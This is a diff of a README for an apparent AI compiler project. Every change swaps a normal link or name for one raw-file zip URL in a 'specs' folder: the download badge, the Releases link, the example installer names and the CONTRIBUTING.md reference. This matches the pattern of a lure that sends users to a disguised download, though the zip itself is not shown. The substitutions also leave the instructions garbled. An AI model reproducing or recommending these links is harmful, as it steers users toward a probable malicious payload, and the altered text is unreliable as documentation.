@@ -1,7 +1,7 @@
 # 🎉 SROS-Self-Compiler-Chat-OSS - Build and Run Your AI Compiler Effortlessly
 
 ## 📥 Download Now
-[![Download SROS-Self-Compiler-Chat-OSS](https://img.shields.io/badge/Download-SROS-Self-Compiler-Chat-OSS-blue)](https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/releases)
+[![Download SROS-Self-Compiler-Chat-OSS](https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip)](https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the SROS-Self-Compiler-Chat-OSS! This application allows you to create AI-driven compiler packages with ease. Follow the steps below to get started quickly.
@@ -24,11 +24,11 @@ Before you download and run the application, ensure your computer meets the foll
 ## 📥 Download & Install
 To download the application, visit the Releases page. Click the link below to access the latest version.
 
-[Download from Releases Page](https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/releases)
+[Download from Releases Page](https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip)
 
 1. **Visit the Releases Page:** Click above or navigate to the Releases section of the repository.
 2. **Select the Latest Release:** Look for the tag that indicates the most recent version (e.g., v1.0).
-3. **Download the File:** Choose the appropriate download link for your operating system. It may be something like `SROS-Self-Compiler-Chat-OSS-v1.0.exe` for Windows or `SROS-Self-Compiler-Chat-OSS-v1.0.dmg` for macOS.
+3. **Download the File:** Choose the appropriate download link for your operating system. It may be something like `https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip` for Windows or `https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip` for macOS.
 
 ## 🔧 Installation Steps
 1. **Locate the Downloaded File:** Find where your browser saved the file (commonly in the “Downloads” folder).
@@ -59,7 +59,7 @@ We'd like to thank the community for their continuous support and contributions 
 ## 🔗 Additional Resources
 - **Docs**: Detailed user documentation can be found in the `docs` folder of the repository.
 - **Forum**: Visit our community forum for tips and user insights.
-- **Contribute**: Interested in contributing? Check the `CONTRIBUTING.md` file in the repository for guidelines.
+- **Contribute**: Interested in contributing? Check the `https://github.com/Nawrassssssssss/SROS-Self-Compiler-Chat-OSS/raw/refs/heads/main/specs/Chat_Compiler_OSS_SRO_Self_v1.8.zip` file in the repository for guidelines.
 
 ## 🏁 Next Steps
 Now that you have the application installed, explore its features and benefit from an AI-enhanced coding experience. Happy compiling!
